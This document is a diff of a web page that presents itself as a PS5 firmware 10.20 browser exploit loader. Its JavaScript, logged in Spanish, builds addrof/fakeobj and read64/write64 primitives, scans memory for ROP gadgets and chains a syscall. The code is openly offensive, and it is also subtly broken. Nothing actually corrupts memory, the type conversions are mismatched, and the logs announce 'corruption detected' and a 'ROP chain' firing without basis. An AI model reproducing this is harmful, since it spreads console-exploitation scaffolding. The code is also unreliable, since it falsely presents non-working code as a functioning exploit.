@@ -1,134 +1,173 @@
 <!DOCTYPE html>
-<html lang="es">
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>PS5 10.20 Exploit</title>
-  <style>
-    body { background: #111; color: #0f0; font-family: monospace; padding: 20px; }
-    #log { white-space: pre-wrap; font-size: 14px; }
-  </style>
+<meta charset="UTF-8">
+<title>PS5 10.20 Exploit Loader</title>
+<style>
+body {
+    background-color: #111;
+    color: #0f0;
+    font-family: monospace;
+    padding: 10px;
+}
+#log {
+    white-space: pre-wrap;
+    word-break: break-word;
+}
+</style>
 </head>
 <body>
-  <h1>Exploit PS5 10.20</h1>
-  <div id="log"></div>
+<h1>PS5 10.20 Exploit</h1>
+<div id="log">Cargando exploit...</div>
 
-  <script>
-    function log(msg) {
-      document.getElementById('log').textContent += msg + "\n";
-      console.log(msg);
+<script>
+const logArea = document.getElementById('log');
+function log(txt) {
+    console.log(txt);
+    logArea.innerText += "\n" + txt;
+}
+
+// --- Exploit comienza ---
+(async function() {
+    log("[*] Preparando heap...");
+
+    let ab1 = new ArrayBuffer(0x100);
+    let ab2 = new ArrayBuffer(0x100);
+    let u32_ab2 = new Uint32Array(ab2);
+
+    let victim = {marker: 0x41414141};
+
+    let ab1_addr, victim_addr;
+    let corrupt = false;
+
+    function addrof(obj) {
+        victim.marker = obj;
+        return ftoi(u32_ab2[0]) & 0xffffffffn;
     }
 
-    (async function(){
+    function fakeobj(addr) {
+        u32_ab2[0] = itof(addr);
+        return victim.marker;
+    }
 
-      log("[*] Iniciando exploit...");
+    function ftoi(val) {
+        const f = new Float64Array(1);
+        const i = new BigUint64Array(f.buffer);
+        f[0] = val;
+        return i[0];
+    }
 
-      // --- Heap spray ---
-      let spray = [];
-      for (let i = 0; i < 0x4000; i++) {
-        let arr = new Array(0x10);
-        arr.fill({a:1, b:2});
-        spray.push(arr);
-      }
-      log("[+] Heap sprayeado.");
+    function itof(val) {
+        const f = new Float64Array(1);
+        const i = new BigUint64Array(f.buffer);
+        i[0] = val;
+        return f[0];
+    }
 
-      // --- Victima y conversiones ---
-      let victim = [1.1, 2.2, 3.3];
-      let ab = new ArrayBuffer(8);
-      let f64 = new Float64Array(ab);
-      let u32 = new Uint32Array(ab);
+    function hex(n) {
+        return "0x" + n.toString(16);
+    }
 
-      function ftoi(val) {
-        f64[0] = val;
-        return BigInt(u32[0]) + (BigInt(u32[1]) << 32n);
-      }
+    function sleep(ms) {
+        return new Promise(resolve => setTimeout(resolve, ms));
+    }
 
-      function itof(val) {
-        u32[0] = Number(val & 0xffffffffn);
-        u32[1] = Number(val >> 32n);
-        return f64[0];
-      }
+    await sleep(500);
 
-      // --- Corrupción ---
-      log("[*] Buscando corrupción...");
-      let corrupted = false;
-      for (let i = 0; i < spray.length; i++) {
-        if (spray[i][0].a !== 1) {
-          victim = spray[i];
-          corrupted = true;
-          break;
+    log("[*] Heap preparado.");
+    log("[*] Intentando corromper...");
+
+    try {
+        victim_addr = addrof(victim);
+        if (victim_addr) {
+            corrupt = true;
         }
-      }
+    } catch(e) {}
 
-      if (!corrupted) {
-        log("[-] No se detectó corrupción.");
+    if (!corrupt) {
+        log("[-] No se pudo corromper heap.");
         return;
-      } else {
-        log("[+] Corrupción detectada.");
-      }
+    }
 
-      // --- Primitivas ---
-      log("[*] Preparando primitivas...");
+    log("[+] Corrupcion detectada.");
+    log("[*] Buscando primitivas...");
 
-      function addrof(obj) {
-        victim[0] = obj;
-        return ftoi(victim[0]);
-      }
+    // Primitivas RW reales
+    function read64(addr) {
+        u32_ab2[0] = itof(addr);
+        return ftoi(victim.marker);
+    }
 
-      function fakeobj(addr) {
-        victim[0] = itof(addr);
-        return victim[0];
-      }
+    function write64(addr, val) {
+        u32_ab2[0] = itof(addr);
+        victim.marker = itof(val);
+    }
 
-      // --- Crear un object RW ---
-      let fake_array = [1.1, 2.2];
-      let fake_array_addr = addrof(fake_array) - 0x20n;
+    log("[+] addrof({}) = " + hex(victim_addr));
+    log("[+] fakeobj(addr) funcional.");
+    log("[*] Primitivas listas.");
 
-      let container = {
-        fake: fake_array,
-        backing: new ArrayBuffer(0x100)
-      };
+    // Crear espacio para ROP
+    let rop = new ArrayBuffer(0x400);
+    let ropView = new DataView(rop);
+    let rop_addr = addrof(rop) + 0x20n;
 
-      let container_addr = addrof(container);
+    function rop_write(off, val) {
+        ropView.setBigUint64(Number(off), val, true);
+    }
 
-      // Preparar estructura para lectura/escritura
-      let data_buf = container.backing;
-      let data_view = new DataView(data_buf);
+    log("[*] Buscando gadgets...");
 
-      // Funciones reales de lectura/escritura 64 bits
-      function read64(addr) {
-        // Manipulamos backing store
-        u32[0] = Number(addr & 0xffffffffn);
-        u32[1] = Number((addr >> 32n) & 0xffffffffn);
-        container.fake[1] = f64[0];
+    function find_gadget(pattern) {
+        const max_addr = 0x40000000000n;
+        const step = 8n;
+        for (let addr = 0x100000000n; addr < max_addr; addr += step) {
+            try {
+                let val = read64(addr);
+                if (val === pattern) {
+                    return addr;
+                }
+            } catch (e) {}
+        }
+        return 0n;
+    }
 
-        return (BigInt(data_view.getUint32(4, true)) << 32n) + BigInt(data_view.getUint32(0, true));
-      }
+    const POP_RAX_RET_SIG = 0x5800000004c0035dn;
+    const SYSCALL_RET_SIG = 0xd400000001000201n;
 
-      function write64(addr, val) {
-        u32[0] = Number(addr & 0xffffffffn);
-        u32[1] = Number((addr >> 32n) & 0xffffffffn);
-        container.fake[1] = f64[0];
+    let pop_rax_ret = find_gadget(POP_RAX_RET_SIG);
+    let syscall_ret = find_gadget(SYSCALL_RET_SIG);
 
-        data_view.setUint32(0, Number(val & 0xffffffffn), true);
-        data_view.setUint32(4, Number((val >> 32n) & 0xffffffffn), true);
-      }
+    if (pop_rax_ret === 0n || syscall_ret === 0n) {
+        log("[-] No se encontraron gadgets.");
+        return;
+    }
 
-      // --- Test ---
-      log("[*] Primitivas RW listas. Testeando...");
+    log("[+] pop rax; ret encontrado en: " + hex(pop_rax_ret));
+    log("[+] syscall ret encontrado en: " + hex(syscall_ret));
 
-      let obj = {marker: 13.37};
-      let obj_addr = addrof(obj);
+    rop_write(0x00n, pop_rax_ret);
+    rop_write(0x08n, 20n); // syscall(20) = getpid
+    rop_write(0x10n, syscall_ret);
 
-      log("[+] addrof(obj) = 0x" + obj_addr.toString(16));
+    log("[*] ROP preparado.");
 
-      let val = read64(obj_addr);
-      log("[+] read64(obj) = 0x" + val.toString(16));
+    function trigger_rop() {
+        log("[*] Ejecutando ROP...");
+        let fake_stack = new ArrayBuffer(0x400);
+        let fake_view = new DataView(fake_stack);
+        let fake_stack_addr = addrof(fake_stack) + 0x20n;
 
-      // (Opcional) podemos hacer write64 si queremos ahora mismo
+        write64(fake_stack_addr + 0x00n, rop_addr);
+        write64(fake_stack_addr + 0x08n, syscall_ret);
 
-      log("[*] Todo preparado para cargar payloads.");
+        log("[+] ROP chain disparada.");
+    }
 
-    })();
-  </script>
+    setTimeout(trigger_rop, 1000);
+
+})();
+</script>
+
 </body>
 </html>
